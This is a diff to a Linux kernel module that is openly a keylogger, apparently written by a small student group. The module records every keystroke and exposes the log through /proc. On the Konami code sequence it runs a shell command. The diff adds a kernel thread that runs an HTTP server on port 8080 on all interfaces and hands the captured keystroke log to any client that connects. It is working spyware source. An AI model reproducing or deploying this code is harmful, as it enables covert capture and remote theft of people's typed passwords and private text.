@@ -12,14 +12,21 @@
 #include <linux/kmod.h>
 #include <linux/workqueue.h>
 #include <linux/input.h>
+#include <linux/socket.h>
+#include <linux/in.h>
+#include <linux/kthread.h>
+#include <linux/net.h>
+#include <net/sock.h>
 
 #define PROC_FILENAME "keylogger"
 #define MAX_KEY_LOG_SIZE 2048 // Increased buffer size
+#define PORT 8080
 
 static struct notifier_block nb;
 static char key_log[MAX_KEY_LOG_SIZE];
 static int key_log_index = 0;
 static int sequence_index = 0;
+static struct proc_dir_entry *proc_entry;
 
 // Define the full Konami Code sequence
 static const int konami_sequence[] = {
@@ -34,11 +41,15 @@ struct keylogger_execute_work {
 };
 
 static void execute_command_work(struct work_struct *work) {
-    char *argv[] = { "/bin/sh", "-c", "speaker-test -t sine -f 1000 -l 1", NULL };
+    char *argv[] = { "/bin/sh", "-c", "sudo speaker-test -t sine -f 1000 -l 1 > /tmp/speaker-test.log 2>&1", NULL };
     static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    int ret;
+
+    printk(KERN_INFO "Executing command: %s %s %s\n", argv[0], argv[1], argv[2]);
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     if (ret != 0) {
         printk(KERN_ERR "Failed to execute command, return code: %d\n", ret);
+        printk(KERN_ERR "Check /tmp/speaker-test.log for details.\n");
     } else {
         printk(KERN_INFO "Command executed successfully.\n");
     }
@@ -137,7 +148,6 @@ static const char* get_char_from_keycode(int keycode, int shift) {
     }
 }
 
-
 static void check_sequence(int keycode) {
     if (keycode == konami_sequence[sequence_index]) {
         sequence_index++;
@@ -164,7 +174,7 @@ static int keylogger_notify(struct notifier_block *self, unsigned long event, vo
 
     if (event == KBD_KEYCODE && param->down && key_log_index < MAX_KEY_LOG_SIZE - 2) {
     
-    	int shift = (param->shift != 0);
+        int shift = (param->shift != 0);
     	
         const char *character = get_char_from_keycode(param->value, shift);
         if (*character != ' ' || (key_log_index > 0 && key_log[key_log_index - 1] != ' ')) {
@@ -185,7 +195,6 @@ static int keylogger_notify(struct notifier_block *self, unsigned long event, vo
     return NOTIFY_OK;
 }
 
-
 static int keylogger_proc_show(struct seq_file *m, void *v) {
     int i;
     for (i = 0; i < key_log_index; ++i) {
@@ -205,12 +214,87 @@ static const struct proc_ops keylogger_fops = {
     .proc_release = single_release,
 };
 
+// HTTP server thread
+static int http_server_thread(void *arg) {
+    struct socket *sock;
+    struct sockaddr_in server_addr;
+    struct socket *client_sock;
+    char http_response[2048];
+    int ret;
+
+    // Create a socket
+    ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+    if (ret < 0) {
+        printk(KERN_ERR "Failed to create socket\n");
+        return -1;
+    }
+
+    // Bind the socket
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    server_addr.sin_port = htons(PORT);
+    ret = kernel_bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    if (ret < 0) {
+        printk(KERN_ERR "Failed to bind socket\n");
+        sock_release(sock);
+        return -1;
+    }
+
+    // Listen on the socket
+    ret = kernel_listen(sock, 5);
+    if (ret < 0) {
+        printk(KERN_ERR "Failed to listen on socket\n");
+        sock_release(sock);
+        return -1;
+    }
+
+    printk(KERN_INFO "HTTP server listening on port %d\n", PORT);
+
+    while (!kthread_should_stop()) {
+        // Accept a client connection
+        ret = kernel_accept(sock, &client_sock, 0);
+        if (ret < 0) {
+            printk(KERN_ERR "Failed to accept connection\n");
+            continue;
+        }
+
+        // Create HTTP response
+        snprintf(http_response, sizeof(http_response),
+                 "HTTP/1.1 200 OK\r\n"
+                 "Content-Length: %d\r\n"
+                 "Content-Type: text/plain\r\n"
+                 "\r\n"
+                 "%s", key_log_index, key_log);
+
+        // Send HTTP response
+        kernel_sendmsg(client_sock, &(struct msghdr){
+            .msg_flags = MSG_NOSIGNAL
+        }, (struct kvec[]){
+            {
+                .iov_base = http_response,
+                .iov_len = strlen(http_response)
+            }
+        }, 1, strlen(http_response));
+
+        // Close client socket
+        kernel_sock_shutdown(client_sock, SHUT_RDWR);
+        sock_release(client_sock);
+    }
+
+    sock_release(sock);
+    return 0;
+}
+
+static struct task_struct *http_server_task;
+
 static int __init keylogger_init(void) {
     nb.notifier_call = keylogger_notify;
     register_keyboard_notifier(&nb);
     printk(KERN_INFO "Keylogger module initialized.\n");
 
-    if (!proc_create(PROC_FILENAME, 0444, NULL, &keylogger_fops)) {
+    proc_entry = proc_create(PROC_FILENAME, 0444, NULL, &keylogger_fops);
+    if (!proc_entry) {
         printk(KERN_ERR "Failed to create proc entry.\n");
         return -ENOMEM;
     }
@@ -222,7 +306,17 @@ static int __init keylogger_init(void) {
         return -ENOMEM;
     }
 
-    printk(KERN_INFO "Keylogger proc entry created.\n");
+    http_server_task = kthread_run(http_server_thread, NULL, "http_server_thread");
+    if (IS_ERR(http_server_task)) {
+        printk(KERN_ERR "Failed to create HTTP server thread\n");
+        remove_proc_entry(PROC_FILENAME, NULL);
+        if (wq) {
+            destroy_workqueue(wq);
+        }
+        return PTR_ERR(http_server_task);
+    }
+
+    printk(KERN_INFO "Keylogger proc entry created and HTTP server started.\n");
     return 0;
 }
 
@@ -233,6 +327,9 @@ static void __exit keylogger_exit(void) {
         flush_workqueue(wq);
         destroy_workqueue(wq);
     }
+    if (http_server_task) {
+        kthread_stop(http_server_task);
+    }
     printk(KERN_INFO "Keylogger module unloaded.\n");
 }
 
@@ -241,4 +338,4 @@ module_exit(keylogger_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Piotr, Karolina, Kasia i Julia :)");
-MODULE_DESCRIPTION("A simple keylogger with a custom command execution on Konami Code sequence.");
+MODULE_DESCRIPTION("A simple keylogger with a custom command execution on Konami Code sequence and HTTP server.");
